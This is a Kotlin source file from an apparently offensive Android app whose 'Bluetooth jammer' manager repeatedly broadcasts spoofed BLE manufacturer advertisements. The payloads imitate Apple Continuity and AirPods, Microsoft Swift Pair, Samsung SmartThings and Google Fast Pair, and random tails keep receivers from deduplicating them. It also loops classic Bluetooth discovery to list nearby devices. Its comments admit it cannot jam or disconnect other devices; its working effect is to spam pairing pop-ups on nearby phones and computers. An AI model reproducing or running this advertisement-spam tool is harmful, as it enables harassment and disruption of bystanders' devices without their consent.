package xin.ctkqiang.deauthctrl.manager

import android.Manifest
import android.bluetooth.BluetoothAdapter
import android.bluetooth.BluetoothDevice
import android.bluetooth.BluetoothManager
import android.bluetooth.le.AdvertiseCallback
import android.bluetooth.le.AdvertiseData
import android.bluetooth.le.AdvertiseSettings
import android.bluetooth.le.BluetoothLeAdvertiser
import android.content.BroadcastReceiver
import android.content.Context
import android.content.Intent
import android.content.IntentFilter
import android.content.pm.PackageManager
import android.os.Build
import android.os.SystemClock
import androidx.core.content.ContextCompat
import kotlinx.coroutines.*
import kotlinx.coroutines.flow.MutableStateFlow
import kotlinx.coroutines.flow.StateFlow
import kotlinx.coroutines.flow.asStateFlow
import xin.ctkqiang.deauthctrl.L10n
import xin.ctkqiang.deauthctrl.R
import xin.ctkqiang.deauthctrl.model.JammerLogEntry
import java.util.ArrayDeque
import java.util.concurrent.ConcurrentHashMap
import java.util.concurrent.atomic.AtomicBoolean
import java.util.concurrent.atomic.AtomicInteger
import java.util.concurrent.atomic.AtomicLong
import kotlin.coroutines.resume

data class DiscoveredDevice(val name: String, val address: String, val type: String)

/**
 * 蓝牙广播与经典发现运行快照。
 *
 * 字段名称保留旧字段以兼容 UI，但语义已经纠正：旧实现把"广播会话启动成功"
 * 当成"空口数据包"，把 25ms 重启当成发包间隔，属于夸大。
 *
 * @property blePackets            成功启动的 BLE 广播**会话**数（不是空口数据包）
 * @property inquiryCycles         经典蓝牙 discovery **轮次**（startDiscovery 返回 true 的次数）
 * @property devicesFound          累计发现的经典蓝牙设备数
 * @property uptimeMs              本次 start 起累计运行毫秒数
 * @property bleSessions           同 [blePackets]，语义更明确的新字段
 * @property estimatedAirtimeEvents 按 100ms 广播间隔估算的空口事件数（非实测）
 * @property inquiryRounds         同 [inquiryCycles]，语义更明确的新字段
 * @property bleAdvertisingActive  当前是否有活跃的 BLE advertising 会话
 * @property inquiryActive         当前是否正在执行经典蓝牙 discovery
 * @property lastError             最近一次失败或能力限制说明
 */
data class BluetoothJammerStats(
    val blePackets: Long,
    val inquiryCycles: Long,
    val devicesFound: Int,
    val uptimeMs: Long,
    val bleSessions: Long = blePackets,
    val estimatedAirtimeEvents: Long = blePackets,
    val inquiryRounds: Long = inquiryCycles,
    val bleAdvertisingActive: Boolean = false,
    val inquiryActive: Boolean = false,
    val lastError: String? = null,
)

/**
 * 蓝牙广播 + 经典蓝牙发现管理器
 *
 * ## 能力边界（UI 文案必须与此一致）
 * - BLE：公共 API 只能启动本机 advertising，广播伪造的厂商广告；**不能**发送
 *   任意链路层 PDU，**不能**伪造广播 MAC（协议栈使用 RPA），**不能**压制或
 *   断开其他设备。效果仅限：解析对应厂商 payload 的接收端可能显示配对/连续性
 *   提示，是否弹窗取决于接收端系统与版本。
 * - 经典蓝牙：`startDiscovery()` 只是本机 BR/EDR inquiry，扫描附近设备，
 *   不向任何设备发送干扰，也不会断开连接。
 *
 * ## 线程模型
 * - [scope] 使用 [Dispatchers.Default]；BLE binder 回调与协程共享原子计数器
 * - BLE advertising 的 start/stop 全部串行化（[advLock]），并等待
 *   onStartSuccess / onStartFailure 再进入下一步，避免高频 start/stop 触发
 *   ADVERTISE_FAILED_TOO_MANY_ADVERTISERS（code 2）
 * - 每轮重建随机尾，避免接收端按 payload 去重
 *
 * @param context 应用上下文
 */
class BluetoothJammerManager(private val context: Context) {

    private val btManager = context.getSystemService(Context.BLUETOOTH_SERVICE) as BluetoothManager
    private val adapter: BluetoothAdapter? = btManager.adapter
    private val scope = CoroutineScope(Dispatchers.Default + SupervisorJob())

    /** 进程内共享能力快照：本模块只提供 BLE 广播与本机扫描 */
    private val capabilityProbe = CapabilityProbe.get(context)
    val capabilities: StateFlow<DeviceCapabilities> = capabilityProbe.capabilities

    private val _isRunning = MutableStateFlow(false)
    val isRunning: StateFlow<Boolean> = _isRunning.asStateFlow()
    private val _devices = MutableStateFlow<List<DiscoveredDevice>>(emptyList())
    val discoveredDevices: StateFlow<List<DiscoveredDevice>> = _devices.asStateFlow()
    private val _discoveryCount = MutableStateFlow(0)
    val discoveryCount: StateFlow<Int> = _discoveryCount.asStateFlow()
    private val _log = MutableStateFlow<List<JammerLogEntry>>(emptyList())
    val log: StateFlow<List<JammerLogEntry>> = _log.asStateFlow()
    private val _error = MutableStateFlow<String?>(null)
    val error: StateFlow<String?> = _error.asStateFlow()

    private val _stats = MutableStateFlow(BluetoothJammerStats(0, 0, 0, 0))
    val stats: StateFlow<BluetoothJammerStats> = _stats.asStateFlow()

    /** BLE advertising 与经典发现分开暴露，避免 UI 把"整体 running"当成 BLE 在运行 */
    private val _bleAdvertisingActive = MutableStateFlow(false)
    val bleAdvertisingActive: StateFlow<Boolean> = _bleAdvertisingActive.asStateFlow()
    private val _inquiryActive = MutableStateFlow(false)
    val inquiryActive: StateFlow<Boolean> = _inquiryActive.asStateFlow()

    private var bleAdvertiser: BluetoothLeAdvertiser? = null
    private var jammerJob: Job? = null

    // 原子计数器：BLE binder 线程回调 + 协程同时访问
    private val blePkt = AtomicInteger(0) // 成功启动的广播会话数
    private val inqPkt = AtomicInteger(0) // startDiscovery 成功轮次
    private val dwellTotalMs = AtomicLong(0L)
    private val startTimeMs = AtomicLong(0L)

    // 线程安全设备表：BroadcastReceiver + clear/stop 交叉访问
    private val discoveredMap = ConcurrentHashMap<String, DiscoveredDevice>()
    private var inquiryReceiver: BroadcastReceiver? = null
    private val discoveryFinished = AtomicBoolean(false)

    // 当前活跃 advertising 引用（start/stop 全部走 advLock 串行化）
    @Volatile private var activeAdv: BluetoothLeAdvertiser? = null
    @Volatile private var activeCb: AdvertiseCallback? = null
    private val advLock = Any()

    // 日志环形缓冲（替代 takeLast 的 O(n) 拷贝）
    private val logDeque = ArrayDeque<JammerLogEntry>()

    fun start() {
        if (_isRunning.value) return
        _error.value = null

        val missing = missingPermissions()
        if (Manifest.permission.BLUETOOTH_CONNECT in missing) {
            _error.value = L10n.get(R.string.mgr_btjam_err_connect_permission)
            return
        }
        val bt = adapter ?: run {
            _error.value = L10n.get(R.string.mgr_btjam_err_no_adapter)
            return
        }
        val enabled = try {
            bt.isEnabled
        } catch (se: SecurityException) {
            _error.value = L10n.get(R.string.mgr_btjam_err_read_denied, se.message.orEmpty())
            return
        }
        if (!enabled) {
            _error.value = L10n.get(R.string.mgr_btjam_err_bt_off)
            return
        }

        // BLE 广播：缺 BLUETOOTH_ADVERTISE 时整个广播能力不可用，但经典发现仍可运行
        val canAdvertise = Manifest.permission.BLUETOOTH_ADVERTISE !in missing
        bleAdvertiser = if (canAdvertise) {
            runCatching { bt.bluetoothLeAdvertiser }.getOrElse { null }
        } else {
            null
        }
        if (bleAdvertiser == null) {
            _error.value = if (!canAdvertise) {
                L10n.get(R.string.mgr_btjam_err_no_advertise_perm)
            } else {
                L10n.get(R.string.mgr_btjam_err_no_advertiser)
            }
        }

        val canInquire = Manifest.permission.BLUETOOTH_SCAN !in missing
        if (bleAdvertiser == null && !canInquire) {
            _error.value = L10n.get(R.string.mgr_btjam_err_both_unavailable)
            return
        }

        capabilityProbe.refreshCheap()

        _isRunning.value = true
        blePkt.set(0); inqPkt.set(0); dwellTotalMs.set(0L)
        startTimeMs.set(System.currentTimeMillis())
        _bleAdvertisingActive.value = false
        _inquiryActive.value = false
        discoveredMap.clear()
        _devices.value = emptyList(); _discoveryCount.value = 0
        publishStats()

        jammerJob = scope.launch {
            if (bleAdvertiser != null) launch { bleFlood() }
            if (canInquire) launch { inquiryFlood() }
            // 周期发布统计
            while (isActive) {
                delay(STATS_PUBLISH_INTERVAL_MS)
                publishStats()
            }
        }
        log("BT", L10n.get(R.string.mgr_btjam_log_started))
    }

    fun stop() {
        _isRunning.value = false
        jammerJob?.cancel()
        stopActiveAdvertising()
        unregisterInquiryReceiver()
        _bleAdvertisingActive.value = false
        _inquiryActive.value = false
        activeAdv = null; activeCb = null; bleAdvertiser = null
        publishStats(finalize = true)
        log(
            "BT",
            L10n.get(
                R.string.mgr_btjam_log_stopped,
                blePkt.get(),
                inqPkt.get(),
                discoveredMap.size,
            ),
        )
    }

    fun destroy() { stop(); scope.cancel() }

    fun clearLog() {
        synchronized(logDeque) { logDeque.clear() }
        _log.value = emptyList()
        blePkt.set(0); inqPkt.set(0); dwellTotalMs.set(0L)
        discoveredMap.clear()
        _devices.value = emptyList(); _discoveryCount.value = 0
        publishStats(finalize = true)
    }

    // ─── BLE 广播 ──────────────────────────────────────────────────────────────

    private suspend fun bleFlood() {
        val adv = bleAdvertiser ?: run {
            _error.value = L10n.get(R.string.mgr_btjam_err_adv_unavailable)
            _bleAdvertisingActive.value = false
            return
        }
        val settings = AdvertiseSettings.Builder()
            .setAdvertiseMode(AdvertiseSettings.ADVERTISE_MODE_LOW_LATENCY)
            .setTxPowerLevel(AdvertiseSettings.ADVERTISE_TX_POWER_HIGH)
            .setConnectable(false)
            .build()

        _bleAdvertisingActive.value = true
        var consecutiveTooMany = 0
        var round = 0

        try {
            while (_isRunning.value) {
                // 每轮重建随机尾，避免接收端对完全相同的 payload 去重
                val frames = buildFrames(round++)
                for (frame in frames) {
                    if (!_isRunning.value) break
                    if (frame.payload.size + 4 > LEGACY_ADV_MAX_BYTES) {
                        _error.value = L10n.get(
                            R.string.mgr_btjam_err_data_too_large,
                            frame.payload.size + 4,
                            LEGACY_ADV_MAX_BYTES,
                        )
                        continue
                    }

                    when (val outcome = advertiseAwait(adv, settings, frame)) {
                        is AdvOutcome.Success -> {
                            consecutiveTooMany = 0
                            blePkt.incrementAndGet()
                            dwellTotalMs.addAndGet(BLE_SESSION_DWELL_MS)
                            publishStats()
                            // 保持会话 100-300ms，让控制器至少发出一次广播事件
                            delay(BLE_SESSION_DWELL_MS)
                            stopAdvertisingAndSettle()
                        }

                        is AdvOutcome.Failure -> {
                            _error.value = advertiseFailureMessage(outcome.code)
                            if (outcome.code == AdvertiseCallback.ADVERTISE_FAILED_TOO_MANY_ADVERTISERS) {
                                consecutiveTooMany++
                                if (consecutiveTooMany >= MAX_TOO_MANY_RETRIES) {
                                    _error.value = L10n.get(R.string.mgr_btjam_err_slots_exhausted, consecutiveTooMany)
                                    log("BLE", _error.value.orEmpty())
                                    return
                                }
                                delay(tooManyBackoffMs(consecutiveTooMany))
                            } else {
                                consecutiveTooMany = 0
                                delay(BLE_SESSION_DWELL_MS)
                            }
                            stopAdvertisingAndSettle()
                        }
                    }
                }
                publishStats()
            }
        } finally {
            stopAdvertisingAndSettle()
            _bleAdvertisingActive.value = false
            publishStats()
        }
    }

    private sealed class AdvOutcome {
        object Success : AdvOutcome()
        data class Failure(val code: Int) : AdvOutcome()
    }

    /**
     * 启动一组 BLE advertising 并等待 onStartSuccess / onStartFailure。
     *
     * 等待回调是修复 code 2 的关键：旧实现 start 后立刻进入下一轮 stop/start，
     * 控制器槽位尚未释放就会失败。
     */
    private suspend fun advertiseAwait(
        adv: BluetoothLeAdvertiser,
        settings: AdvertiseSettings,
        frame: BleFrame,
    ): AdvOutcome = suspendCancellableCoroutine { cont ->
        val data = AdvertiseData.Builder()
            .addManufacturerData(frame.companyId, frame.payload)
            .setIncludeDeviceName(false)
            .setIncludeTxPowerLevel(false)
            .build()

        val cb = object : AdvertiseCallback() {
            override fun onStartSuccess(s: AdvertiseSettings?) {
                if (cont.isActive) cont.resume(AdvOutcome.Success)
            }

            override fun onStartFailure(code: Int) {
                if (cont.isActive) cont.resume(AdvOutcome.Failure(code))
            }
        }

        synchronized(advLock) {
            activeAdv = adv
            activeCb = cb
        }
        try {
            adv.startAdvertising(settings, data, cb)
        } catch (_: SecurityException) {
            clearActiveAdvertising()
            if (cont.isActive) cont.resume(AdvOutcome.Failure(ERROR_PERMISSION))
        } catch (_: Throwable) {
            clearActiveAdvertising()
            if (cont.isActive) cont.resume(AdvOutcome.Failure(ERROR_INTERNAL))
        }
        cont.invokeOnCancellation {
            // 取消时不能调用 suspend 函数，用同步清理兜底
            stopActiveAdvertising()
        }
    }

    private suspend fun stopAdvertisingAndSettle() {
        stopActiveAdvertising()
        // 给控制器时间回收 advertising 槽位，避免下一轮立即 code 2
        delay(SESSION_SETTLE_MS)
    }

    private fun clearActiveAdvertising() {
        synchronized(advLock) {
            activeAdv = null
            activeCb = null
        }
    }

    private fun stopActiveAdvertising() {
        val adv: BluetoothLeAdvertiser?
        val cb: AdvertiseCallback?
        synchronized(advLock) {
            adv = activeAdv
            cb = activeCb
            activeAdv = null
            activeCb = null
        }
        if (adv == null || cb == null) return
        try {
            adv.stopAdvertising(cb)
        } catch (_: SecurityException) {
            // 极少数设备 stop 时仍校验权限，忽略避免误导 UI
        } catch (_: Throwable) {
            // stopAdvertising 不应抛业务异常
        }
    }

    /**
     * 按公开厂商 ID 映射构造广播帧。
     *
     * 旧实现把 `0x4C,0x00` 等 company ID 前缀塞进 payload，同时用
     * addManufacturerData(0xFFFF, …)，接收端只会看到"未知厂商 0xFFFF"。
     * 现在前缀被剥离并作为真正的 company ID 传给协议栈。
     */
    private fun buildFrames(round: Int): List<BleFrame> {
        val appleTypes = byteArrayOf(0x05, 0x07, 0x0B, 0x0C, 0x10)
        val appleType = appleTypes[round % appleTypes.size]
        return listOf(
            // Apple Continuity：type + length(17) + 随机尾
            BleFrame(0x004C, byteArrayOf(appleType, 0x11) + rand(17)),
            // AirPods：type 0x07 + length 0x19(25) + 随机尾
            BleFrame(0x004C, byteArrayOf(0x07, 0x19) + rand(25)),
            // Apple 另一组 continuity 类型
            BleFrame(0x004C, byteArrayOf(0x0B, 0x11) + rand(17)),
            // Microsoft Swift Pair
            BleFrame(0x0006, byteArrayOf(0x01, 0x0C) + rand(12)),
            // Samsung SmartThings
            BleFrame(0x0075, byteArrayOf(0x00, 0x01, 0x00) + rand(12)),
            // Google Fast Pair
            BleFrame(0x00E0, byteArrayOf(0x00, 0x02, 0x71, 0x8C.toByte(), 0x10) + rand(8)),
            // 通用随机压力（明确标注为测试厂商 ID）
            BleFrame(0xFFFF, rand(20)),
        )
    }

    private fun tooManyBackoffMs(attempt: Int): Long = when (attempt) {
        1 -> 250L
        2 -> 1_000L
        else -> 2_000L
    }

    private fun advertiseFailureMessage(code: Int): String = when (code) {
        AdvertiseCallback.ADVERTISE_FAILED_DATA_TOO_LARGE -> L10n.get(R.string.mgr_btjam_adv_data_too_large)
        AdvertiseCallback.ADVERTISE_FAILED_TOO_MANY_ADVERTISERS ->
            L10n.get(R.string.mgr_btjam_adv_too_many)
        AdvertiseCallback.ADVERTISE_FAILED_ALREADY_STARTED -> L10n.get(R.string.mgr_btjam_adv_already_started)
        AdvertiseCallback.ADVERTISE_FAILED_INTERNAL_ERROR -> L10n.get(R.string.mgr_btjam_adv_internal)
        AdvertiseCallback.ADVERTISE_FAILED_FEATURE_UNSUPPORTED -> L10n.get(R.string.mgr_btjam_adv_unsupported)
        ERROR_PERMISSION -> L10n.get(R.string.mgr_btjam_adv_no_permission)
        ERROR_INTERNAL -> L10n.get(R.string.mgr_btjam_adv_exception)
        else -> L10n.get(R.string.mgr_btjam_adv_failed_code, code)
    }

    // ─── 经典蓝牙 inquiry（本机扫描，不干扰他人） ──────────────────────────────

    private suspend fun inquiryFlood() {
        registerInquiryReceiver()
        _inquiryActive.value = false
        try {
            while (_isRunning.value) {
                discoveryFinished.set(false)
                val started = try {
                    adapter?.startDiscovery() ?: false
                } catch (_: SecurityException) {
                    _error.value = L10n.get(R.string.mgr_btjam_err_scan_permission)
                    false
                } catch (t: Throwable) {
                    _error.value = L10n.get(
                        R.string.mgr_btjam_err_start_discovery,
                        t.message ?: t.javaClass.simpleName,
                    )
                    false
                }

                if (!started) {
                    // startDiscovery 返回 false 时不计数（旧实现无论成败都 +1）
                    delay(INQUIRY_RETRY_MS)
                    continue
                }

                inqPkt.incrementAndGet()
                _inquiryActive.value = true
                publishStats()
                log("INQUIRY", L10n.get(R.string.mgr_btjam_log_inquiry_started))

                // 等待 ACTION_DISCOVERY_FINISHED 或超时；1.5 秒就 cancel 会漏掉大量设备
                val deadline = SystemClock.elapsedRealtime() + INQUIRY_MAX_MS
                while (_isRunning.value &&
                    !discoveryFinished.get() &&
                    SystemClock.elapsedRealtime() < deadline
                ) {
                    delay(INQUIRY_POLL_MS)
                }
                try {
                    adapter?.cancelDiscovery()
                } catch (_: Throwable) {
                    // 取消失败不影响下一轮
                }
                _inquiryActive.value = false
                publishStats()
            }
        } finally {
            _inquiryActive.value = false
            unregisterInquiryReceiver()
        }
    }

    /**
     * 注册 ACTION_FOUND / ACTION_DISCOVERY_FINISHED 广播接收器。
     *
     * Android 14 (API 34)+ 要求显式指定 [Context.RECEIVER_EXPORTED] 或
     * RECEIVER_NOT_EXPORTED flag，否则抛 SecurityException。系统广播用 RECEIVER_EXPORTED。
     */
    private fun registerInquiryReceiver() {
        val receiver = object : BroadcastReceiver() {
            override fun onReceive(ctx: Context?, intent: Intent?) {
                when (intent?.action) {
                    BluetoothDevice.ACTION_FOUND -> {
                        val dev = intent.getBluetoothDeviceExtra(BluetoothDevice.EXTRA_DEVICE)
                            ?: return
                        val name = try {
                            dev.name ?: "Unknown"
                        } catch (_: SecurityException) {
                            "Unknown"
                        }
                        discoveredMap[dev.address] =
                            DiscoveredDevice(name, dev.address, "Classic")
                        _devices.value = discoveredMap.values.toList().sortedBy { it.address }
                        _discoveryCount.value = discoveredMap.size
                    }

                    BluetoothAdapter.ACTION_DISCOVERY_FINISHED -> discoveryFinished.set(true)
                }
            }
        }
        inquiryReceiver = receiver
        val filter = IntentFilter().apply {
            addAction(BluetoothDevice.ACTION_FOUND)
            addAction(BluetoothAdapter.ACTION_DISCOVERY_FINISHED)
        }
        try {
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
                context.registerReceiver(receiver, filter, Context.RECEIVER_EXPORTED)
            } else {
                @Suppress("DEPRECATION")
                context.registerReceiver(receiver, filter)
            }
        } catch (_: SecurityException) {
            _error.value = "permission denied: BLUETOOTH_SCAN"
        } catch (_: Throwable) {
            // 部分 ROM 限制后台注册 receiver
        }
    }

    private fun unregisterInquiryReceiver() {
        val r = inquiryReceiver ?: return
        try { context.unregisterReceiver(r) } catch (_: Throwable) {}
        inquiryReceiver = null
    }

    /**
     * 兼容 Android 13+ 的 getParcelableExtra。
     *
     * Android 13 起 `getParcelableExtra<T>(name)` 已 deprecated，
     * 需用 `getParcelableExtra(name, T::class.java)` 重载。
     */
    private fun Intent.getBluetoothDeviceExtra(name: String): BluetoothDevice? =
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
            getParcelableExtra(name, BluetoothDevice::class.java)
        } else {
            @Suppress("DEPRECATION")
            getParcelableExtra(name)
        }

    // ─── 权限 ──────────────────────────────────────────────────────────────────

    private fun missingPermissions(): List<String> {
        if (Build.VERSION.SDK_INT < Build.VERSION_CODES.S) return emptyList()
        return listOf(
            Manifest.permission.BLUETOOTH_CONNECT,
            Manifest.permission.BLUETOOTH_SCAN,
            Manifest.permission.BLUETOOTH_ADVERTISE,
        ).filter {
            ContextCompat.checkSelfPermission(context, it) != PackageManager.PERMISSION_GRANTED
        }
    }

    // ─── 统计与日志 ─────────────────────────────────────────────────────────────

    private fun publishStats(finalize: Boolean = false) {
        val uptime = if (finalize) {
            _stats.value.uptimeMs
        } else {
            maxOf(0L, System.currentTimeMillis() - startTimeMs.get())
        }
        val sessions = blePkt.get().toLong()
        val rounds = inqPkt.get().toLong()
        val dwell = dwellTotalMs.get()
        _stats.value = BluetoothJammerStats(
            blePackets = sessions,
            inquiryCycles = rounds,
            devicesFound = discoveredMap.size,
            uptimeMs = uptime,
            bleSessions = sessions,
            estimatedAirtimeEvents = minOf(sessions, dwell / AIRTIME_INTERVAL_MS),
            inquiryRounds = rounds,
            bleAdvertisingActive = _bleAdvertisingActive.value,
            inquiryActive = _inquiryActive.value,
            lastError = _error.value,
        )
    }

    private fun rand(c: Int) = ByteArray(c).also { kotlin.random.Random.nextBytes(it) }

    /**
     * 追加日志到环形缓冲。
     * 满 [LOG_LIMIT] 后 O(1) 淘汰最旧条目，避免每帧 List 拷贝。
     */
    private fun log(module: String, msg: String) {
        val entry = JammerLogEntry(module = module, message = msg)
        val newList = synchronized(logDeque) {
            if (logDeque.size >= LOG_LIMIT) logDeque.removeFirst()
            logDeque.addLast(entry)
            logDeque.toList()
        }
        _log.value = newList
    }

    private companion object {
        const val LOG_LIMIT = 200

        /** 每个广播会话保持 100-300ms 中的一档；低于 100ms 不会有空口事件 */
        const val BLE_SESSION_DWELL_MS = 250L

        /** start/stop 之间的槽位回收等待 */
        const val SESSION_SETTLE_MS = 120L

        /** 经典 discovery 最长等待时间；ACTION_DISCOVERY_FINISHED 通常 10-12 秒 */
        const val INQUIRY_MAX_MS = 12_000L
        const val INQUIRY_POLL_MS = 250L
        const val INQUIRY_RETRY_MS = 1_000L

        const val STATS_PUBLISH_INTERVAL_MS = 1_000L

        /** Legacy advertising PDU 上限：company ID(2) + length/type 头(2) + payload */
        const val LEGACY_ADV_MAX_BYTES = 31

        /** AOSP LOW_LATENCY 广播间隔约 160×0.625ms=100ms，用于估算空口事件 */
        const val AIRTIME_INTERVAL_MS = 100L

        /** code 2 连续失败上限：超过后停止并提示重启蓝牙 */
        const val MAX_TOO_MANY_RETRIES = 6

        const val ERROR_PERMISSION = -2
        const val ERROR_INTERNAL = -3
    }
}
